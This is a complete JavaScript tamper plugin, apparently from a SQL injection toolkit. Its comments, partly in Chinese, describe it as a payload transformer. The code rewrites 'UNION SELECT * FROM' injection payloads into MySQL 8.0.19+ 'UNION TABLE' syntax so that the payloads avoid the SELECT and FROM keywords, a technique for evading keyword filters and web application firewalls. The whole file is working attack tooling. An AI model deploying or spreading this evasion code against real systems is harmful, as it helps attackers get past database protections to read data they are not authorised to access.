//@name: UNION TABLE
//@usage: payload
//@enable: false
//@description: UNION SELECT * FROM t→UNION TABLE t（无SELECT/FROM关键字，MySQL>=8.0.19）
function tamper(payload){
    if (!payload) { return payload; }
    var tailOk = function(t){ return !t || /^(?:ORDER\s+BY|LIMIT)\b/i.test(t); };
    var retVal = payload.replace(/(UNION)(\s+ALL)?\s+SELECT\s+\*\s+FROM\s+(`[^`]+`(?:\.`[^`]+`)?|\w+(?:\.\w+)?)([\s\S]*?)(?=(?:--|#|\/\*)|$)/gi,
        function(m, union, all, table, tail){
            tail = (tail || '').trim();
            if (tail && !tailOk(tail)) { return m; }
            return union + (all || '') + ' TABLE ' + table + (tail ? ' ' + tail : '');
        });
    retVal = retVal.replace(/\(\s*SELECT\s+\*\s+FROM\s+(`[^`]+`(?:\.`[^`]+`)?|\w+(?:\.\w+)?)([^()]*?)\s*\)/gi,
        function(m, table, tail){
            tail = (tail || '').trim();
            if (tail && !tailOk(tail)) { return m; }
            return '(TABLE ' + table + (tail ? ' ' + tail : '') + ')';
        });
    return retVal;
}